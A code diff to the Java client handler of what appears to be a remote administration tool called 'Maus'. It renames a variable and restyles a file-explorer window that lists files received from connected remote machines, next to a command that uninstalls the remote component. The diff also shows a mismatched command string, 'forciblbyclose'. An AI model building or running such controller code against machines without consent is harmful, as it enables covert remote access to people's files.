@@ -71,9 +71,9 @@ public class ClientHandler implements Runnable, Repository {
         byte[] buffer = new byte[1024];
         int read;
         while((read = is.read(buffer)) != -1) {
-            String output = new String(buffer, 0, read);
-            System.out.print(output);
-            if(output.contains("FILELIST")){
+            String input = new String(buffer, 0, read);
+            System.out.print(input);
+            if(input.contains("FILELIST")){
                 BufferedInputStream bis = new BufferedInputStream(client.getClient().getInputStream());
                 DataInputStream dis = new DataInputStream(bis);
                 int filesCount = dis.readInt();
@@ -85,11 +85,12 @@ public class ClientHandler implements Runnable, Repository {
                Platform.runLater(() ->{
                    Stage stage = new Stage();
                    stage.setTitle("Maus File Explorer");
-                   stage.setScene(new Scene(FileExplorerView.getFileExplorerView(fileNames), 900, 500));
+                   stage.initStyle(StageStyle.UNDECORATED);
+                   stage.setScene(new Scene(FileExplorerView.getFileExplorerView(fileNames,stage), 900, 500));
                    stage.show();
                });
             }
-            if(output.contains("FILES")){
+            if(input.contains("FILES")){
                 BufferedInputStream bis = new BufferedInputStream(client.getClient().getInputStream());
                 DataInputStream dis = new DataInputStream(bis);
                 int filesCount = dis.readInt();
@@ -112,7 +113,7 @@ public class ClientHandler implements Runnable, Repository {
                 dis.close();
             }
             /* Uninstall and close remote server - remove from Maus */
-            if(output.contains("forciblbyclose")){
+            if(input.contains("forciblbyclose")){
                 client.clientCommunicate("forciblyclose");
                 PseudoBase.getMausData().remove(client.getIP());
                 CONNECTIONS.remove(client.getIP());
